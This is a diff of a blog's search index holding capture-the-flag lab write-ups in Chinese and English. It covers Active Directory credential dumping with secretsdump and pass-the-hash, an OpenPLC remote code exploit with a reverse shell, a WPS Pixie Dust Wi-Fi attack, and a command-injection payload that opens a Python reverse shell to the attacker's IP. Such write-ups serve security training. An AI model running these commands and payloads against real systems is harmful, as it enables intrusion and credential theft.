Escape any forward slash characters, &quot;/&quot;, with the backslash</span></span><br><span class="line"><span class="comment">&#x27; escape character. All other characters that should be escaped are.</span></span><br><span class="line">strUserDN = <span class="built_in">Replace</span>(strUserDN, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;\/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Bind to the user object in Active Directory with the LDAP provider.</span></span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Set</span> objUser = <span class="built_in">GetObject</span>(<span class="string">&quot;LDAP://&quot;</span> &amp; strUserDN)</span><br><span class="line"><span class="keyword">If</span> (Err.Number &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;User &quot;</span> &amp; strUserNTName _</span><br><span class="line">        &amp; <span class="string">&quot; not found in Active Directory&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Program aborted&quot;</span></span><br><span class="line">    Wscript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">objUser.SetPassword strPassword</span><br><span class="line"><span class="keyword">If</span> (Err.Number &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Password NOT reset for &quot;</span> &amp;vbCrLf &amp; strUserNTName</span><br><span class="line">    Wscript.Echo <span class="string">&quot;Password &quot;</span> &amp; strPassword &amp; <span class="string">&quot; may not be allowed, or&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;this client may not support a SSL connection.&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Program aborted&quot;</span></span><br><span class="line">    Wscript.Quit</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    objUser.AccountDisabled = <span class="literal">False</span></span><br><span class="line">    objUser.Put <span class="string">&quot;pwdLastSet&quot;</span>, <span class="number">0</span></span><br><span class="line">    Err.Clear</span><br><span class="line">    objUser.SetInfo</span><br><span class="line">    <span class="keyword">If</span> (Err.Number &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line">        Wscript.Echo <span class="string">&quot;Password reset for &quot;</span> &amp; strUserNTName</span><br><span class="line">        Wscript.Echo <span class="string">&quot;But, unable to enable account or expire password&quot;</span></span><br><span class="line">        Wscript.Quit</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Wscript.Echo <span class="string">&quot;Password reset, account enabled,&quot;</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;and password expired for user &quot;</span> &amp; strUserNTNamegetting</span><br></pre></td></tr></table></figure>
+<p>發現使用者<code>a-whitehat</code>的密碼：<code>bNdKVkjv3RR9ht</code><br>利用已取得資訊進行下一步攻擊  </p>
+<h4 id="secretdump"><a href="#secretdump" class="headerlink" title="secretdump"></a>secretdump</h4><p>利用使用者<code>a-whitehat</code>的身分結合 impackets 中的 secretdump.py取得各使用者密碼hash<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python3 secretsdump.py -just-dc a-whitehat@vulnnet-rst.local</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/SJdP2iE6p.png" alt="image"><br>成功!!!</p>
+<h4 id="Pass-The-Hash-Attack"><a href="#Pass-The-Hash-Attack" class="headerlink" title="Pass The Hash Attack"></a>Pass The Hash Attack</h4><p>利用剛剛獲得的<code>Administrator</code>密碼hash進行 PTH 攻擊<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.225.254 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1Ti3sV6p.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>中間好像有跳步驟，因為<code>user.txt</code>放在使用者<code>enterprise-core-vn</code>的目錄裡，但…隨便 :D<br>累ㄌ，回去看點Crypto好了(  </p>
+]]></content>
+      <tags>
+        <tag>AD</tag>
+        <tag>Active Directory</tag>
+        <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
       </tags>
   </entry>
   <entry>
@@ -3084,9 +3029,47 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>累了現在，這台機器讓我多學了一個windows提權，開心owob<br><em>p.s.其實我一開始是打 WinPEAS進去，抓到奇怪的process在python3.10，應該可以提權。但是我不會打(可能透過msfconsole(?))</em>  </p>
 ]]></content>
       <tags>
+        <tag>Windows</tag>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
-        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WifineticTwo Write Up on HackTheBox</title>
+    <url>/2024/04/07/wifinetic2-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>不知道為什麼我的OneShot後來要重打進去之後就掛ㄌ…<br><del>反正絕對不是被我玩壞了</del>  </p>
+<p>Attacker’s IP : 10.10.14.46<br>Victim’s IP : 10.10.11.7  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.7 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>result:</strong>  </p>
+<p><img src="https://hackmd.io/_uploads/BJJOAXxgR.png" alt="image">  </p>
+<p>port 8080 開著 OepnPLC的服務：  </p>
+<p><img src="https://hackmd.io/_uploads/rktY0XgxR.png" alt="image">  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2021-31630"><a href="#CVE-2021-31630" class="headerlink" title="CVE-2021-31630"></a>CVE-2021-31630</h4><p>經過上網查詢得到預設密碼為 <code>openplc:openplc</code><br>在exploit-db上發現這個漏洞，從github抓取腳本：<br><a href="https://github.com/thewhiteh4t/cve-2021-31630/blob/main/cve_2021_31630.py">https://github.com/thewhiteh4t/cve-2021-31630/blob/main/cve_2021_31630.py</a><br>指令：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 OpenPLCRCE.py -u openplc -p openplc -lh 10.10.14.46 -lp 9902 http://10.10.11.7:8080</span><br></pre></td></tr></table></figure>
+<p>在自己的9902 port開啟了reverse shell，get shell!!!<br><img src="https://hackmd.io/_uploads/SknSkVxgA.png" alt="image"><br>比較特別的是連上去已經是root+在一個容器裡面而且linpeas告訴我可以打出去，簡單了解後我嘗試了<code>CVE-2022-0492</code>的攻擊一個多小時都沒能成功&#x3D; &#x3D;<br>去喵了網路上的wp才知道要打wifi…  </p>
+<h4 id="wifi-hacking"><a href="#wifi-hacking" class="headerlink" title="wifi hacking"></a>wifi hacking</h4><p>可以參考這篇<br><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi">https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi</a>  </p>
+<p>然後我最後成功的oneshot版本，要先下載：<br><a href="https://github.com/kimocoder/OneShot/blob/master/oneshot.py">https://github.com/kimocoder/OneShot/blob/master/oneshot.py</a><br><strong>wifi scanning:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip <span class="built_in">link</span> show</span><br><span class="line">iw dev wlan0 scan</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HkeTb4gxA.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SJuybEegR.png" alt="image"><br>確認了<code>bss</code>是<code>02:00:00:00:01:00</code>, SSID是<code>plcrouter</code>，在對方機器上利用oneshot進行 WPS Pixie Dust attack：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SkK0WNWeA.png" alt="image">  </p>
+<p>得到密碼(PSK)：NoWWEDoKnowWhaTisReal123!<br>接著把這些資訊存到config(在&#x2F;root)裡面：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpa_passphrase plcrouter &#x27;NoWWEDoKnowWhaTisReal123!&#x27; &gt; config</span><br></pre></td></tr></table></figure>
+<p>最後用<code>wpa_supplicant</code>開啟wifi連線，並手動調整ip(要跟router在同一個內網)  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpa_supplicant -B -c config -i wlan0</span><br><span class="line">ifconfig wlan0 192.168.1.7 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
+<p>再ssh上去就拿到flag啦~  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BkBZXVxg0.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>超愛HTB的效果w<br>打wifi好好玩，可惜我把他玩壞了 :D  </p>
+<p><img src="https://hackmd.io/_uploads/Syjp27egC.png" alt="image">  </p>
+<p>第2048名超酷</p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
+        <tag>Wifi</tag>
       </tags>
   </entry>
   <entry>
@@ -3173,9 +3156,9 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p>除了nt system也可以試著提成別的身分：<br><a href="https://hackmd.io/@veryP/rkFeN_8Vh">https:&#x2F;&#x2F;hackmd.io&#x2F;@veryP&#x2F;rkFeN_8Vh</a></p>
 ]]></content>
       <tags>
+        <tag>Windows</tag>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
-        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
@@ -3211,41 +3194,58 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>WifineticTwo Write Up on HackTheBox</title>
-    <url>/2024/04/07/wifinetic2-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>不知道為什麼我的OneShot後來要重打進去之後就掛ㄌ…<br><del>反正絕對不是被我玩壞了</del>  </p>
-<p>Attacker’s IP : 10.10.14.46<br>Victim’s IP : 10.10.11.7  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.7 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>result:</strong>  </p>
-<p><img src="https://hackmd.io/_uploads/BJJOAXxgR.png" alt="image">  </p>
-<p>port 8080 開著 OepnPLC的服務：  </p>
-<p><img src="https://hackmd.io/_uploads/rktY0XgxR.png" alt="image">  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2021-31630"><a href="#CVE-2021-31630" class="headerlink" title="CVE-2021-31630"></a>CVE-2021-31630</h4><p>經過上網查詢得到預設密碼為 <code>openplc:openplc</code><br>在exploit-db上發現這個漏洞，從github抓取腳本：<br><a href="https://github.com/thewhiteh4t/cve-2021-31630/blob/main/cve_2021_31630.py">https://github.com/thewhiteh4t/cve-2021-31630/blob/main/cve_2021_31630.py</a><br>指令：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 OpenPLCRCE.py -u openplc -p openplc -lh 10.10.14.46 -lp 9902 http://10.10.11.7:8080</span><br></pre></td></tr></table></figure>
-<p>在自己的9902 port開啟了reverse shell，get shell!!!<br><img src="https://hackmd.io/_uploads/SknSkVxgA.png" alt="image"><br>比較特別的是連上去已經是root+在一個容器裡面而且linpeas告訴我可以打出去，簡單了解後我嘗試了<code>CVE-2022-0492</code>的攻擊一個多小時都沒能成功&#x3D; &#x3D;<br>去喵了網路上的wp才知道要打wifi…  </p>
-<h4 id="wifi-hacking"><a href="#wifi-hacking" class="headerlink" title="wifi hacking"></a>wifi hacking</h4><p>可以參考這篇<br><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi">https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi</a>  </p>
-<p>然後我最後成功的oneshot版本，要先下載：<br><a href="https://github.com/kimocoder/OneShot/blob/master/oneshot.py">https://github.com/kimocoder/OneShot/blob/master/oneshot.py</a><br><strong>wifi scanning:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip <span class="built_in">link</span> show</span><br><span class="line">iw dev wlan0 scan</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/HkeTb4gxA.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SJuybEegR.png" alt="image"><br>確認了<code>bss</code>是<code>02:00:00:00:01:00</code>, SSID是<code>plcrouter</code>，在對方機器上利用oneshot進行 WPS Pixie Dust attack：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/SkK0WNWeA.png" alt="image">  </p>
-<p>得到密碼(PSK)：NoWWEDoKnowWhaTisReal123!<br>接著把這些資訊存到config(在&#x2F;root)裡面：  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpa_passphrase plcrouter &#x27;NoWWEDoKnowWhaTisReal123!&#x27; &gt; config</span><br></pre></td></tr></table></figure>
-<p>最後用<code>wpa_supplicant</code>開啟wifi連線，並手動調整ip(要跟router在同一個內網)  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpa_supplicant -B -c config -i wlan0</span><br><span class="line">ifconfig wlan0 192.168.1.7 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
-<p>再ssh上去就拿到flag啦~  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/BkBZXVxg0.png" alt="image">  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>超愛HTB的效果w<br>打wifi好好玩，可惜我把他玩壞了 :D  </p>
-<p><img src="https://hackmd.io/_uploads/Syjp27egC.png" alt="image">  </p>
-<p>第2048名超酷</p>
+    <title>Year of the Fox on TryHackMe</title>
+    <url>/2024/02/23/yptf-tryhackme/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>A fun and relaxing one, my second time to solve a HARD machine on TryHackMe.  </p>
+<p>Victim’s IP : 10.10.150.100<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -Pn 10.10.150.100</span><br></pre></td></tr></table></figure>
+<p><strong>Result:</strong><br><img src="https://hackmd.io/_uploads/BJd3e6r36.png" alt="image">  </p>
+<p>well … a web service and a bunch of smb service, speaking honestly, I was shocked……(cause I’m not familiar with smb yet).  </p>
+<h4 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h4><p><code>enum4linux</code> is a tool being used to leak some informations from a vulnerable linux machine.<br><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux 10.10.150.100</span><br></pre></td></tr></table></figure>
+<p><strong>Result:</strong><br>There was sooooo many informations leaked, but I only used this XD.<br><img src="https://hackmd.io/_uploads/HkwPWTB2p.png" alt="image"><br>There are two UNIX users, fox and rescal.  </p>
+<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><h4 id="http-auth-brute-forcing"><a href="#http-auth-brute-forcing" class="headerlink" title="http auth brute forcing"></a>http auth brute forcing</h4><p>The web application on port 80 have a http auth, and I used <code>hydra</code> to brute force the password with usernames leaked by <code>enum4linux</code><br><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l rascal -P /home/kali/rockyou.txt -t 64 10.10.150.100 http-get</span><br></pre></td></tr></table></figure>
+<p><strong>Result:</strong><br><img src="https://hackmd.io/_uploads/SkTp4arhp.png" alt="image">  </p>
+<h4 id="command-injection"><a href="#command-injection" class="headerlink" title="command injection"></a>command injection</h4><p>After accessing the web application, it looked like this…….  </p>
+<p><img src="https://hackmd.io/_uploads/BJVVETB3a.png" alt="image">  </p>
+<p>It allows user to search for files, which give me an idea to use command injection attack.<br><strong>Payload:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;target&quot;</span>:<span class="string">&quot;\&quot;; python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.9.195.189\&quot;,1004));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\&quot;sh\&quot;)&#x27; ;#&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>Of course, I opened port <strong>1004</strong> to receive shell from victim.  </p>
+<h4 id="ssh-brute-forcing"><a href="#ssh-brute-forcing" class="headerlink" title="ssh brute forcing"></a>ssh brute forcing</h4><p><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulnp</span><br></pre></td></tr></table></figure>
+<p><strong>Result:</strong>  </p>
+<p><img src="https://hackmd.io/_uploads/rJ-dIaBnT.png" alt="image">  </p>
+<p>well…there’s a ssh service in innet, it would be easier to brute force the user’s password from outnet.  </p>
+<p>So I wanted to download <code>socat</code> into victim’s machine from my computer so I could open another port on victim’s machine which pass through the innet <code>ssh</code> service, well…….  </p>
+<p><img src="https://hackmd.io/_uploads/H1eS_TSnT.png" alt="image"><br>Permission denied !<br>So I searched for folder with a writable permission…<br><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">ls</span> -al</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rkH3_6Hna.png" alt="image"><br>P.S. Don’t forget to change permission for it~  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x socat</span><br></pre></td></tr></table></figure>
+<p>The <code>tmp</code> folder can be used !<br>Now, is time to open ssh service to outnet with socat!<br><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./socat tcp-listen:5427,reuseaddr,fork tcp:localhost:22</span><br></pre></td></tr></table></figure>
+<p>Finally, here brute forcing is~<br><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l fox -P /home/kali/rockyou.txt -t 64 ssh://10.10.150.100 -s 5427</span><br></pre></td></tr></table></figure>
+<p><strong>Result:</strong><br><img src="https://hackmd.io/_uploads/BkdAtTHhp.png" alt="image">  </p>
+<p>Now log in with the informations~  </p>
+<p><img src="https://hackmd.io/_uploads/B1f42prna.png" alt="image">  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="poweroff-escalation"><a href="#poweroff-escalation" class="headerlink" title="poweroff escalation"></a>poweroff escalation</h4><p>First of all, check my permission with <code>sudo -l</code>:  </p>
+<p><img src="https://hackmd.io/_uploads/SyxE5arnT.png" alt="image">  </p>
+<p>I setup a http server from it to find out how <code>/usr/bin/shutdown</code> work……<br><strong>Reverse Engineering with ghidra:</strong><br><img src="https://hackmd.io/_uploads/r1KJjTSn6.png" alt="image"><br>…….<br>well, well, well…<br>After that, I searched for the poweroff command on GTFOBins<br><img src="https://hackmd.io/_uploads/HynGjTSnp.png" alt="image"><br>Nothing found.<br><strong>WHAT?!!</strong><br>And finally, I found out this:<br><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</a><br><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt; /tmp/poweroff</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/poweroff</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">sudo /usr/sbin/shutdown</span><br></pre></td></tr></table></figure>
+<p>And finally… get root!!!<br>But what?<br><img src="https://hackmd.io/_uploads/BJFl2pB2T.png" alt="image"><br>Kinda tricky(<br>Just a simple hide&amp;see though…  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / | grep root</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJ7YnTH36.png" alt="image"><br>Aha!<br><img src="https://hackmd.io/_uploads/ryUl66r3T.png" alt="image"><br>So…<br>who can tell me the meaning of:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw</span><br><span class="line">Mwo=</span><br></pre></td></tr></table></figure>
+<p>:&gt;<br>🦈🐋🦈🐋</p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>Now stucked on Year of the Dog :&lt;  </p>
 ]]></content>
       <tags>
+        <tag>CTF</tag>
         <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
-        <tag>Wifi</tag>
+        <tag>TryHackMe</tag>
+        <tag>Command Injection</tag>
       </tags>
   </entry>
 </search>
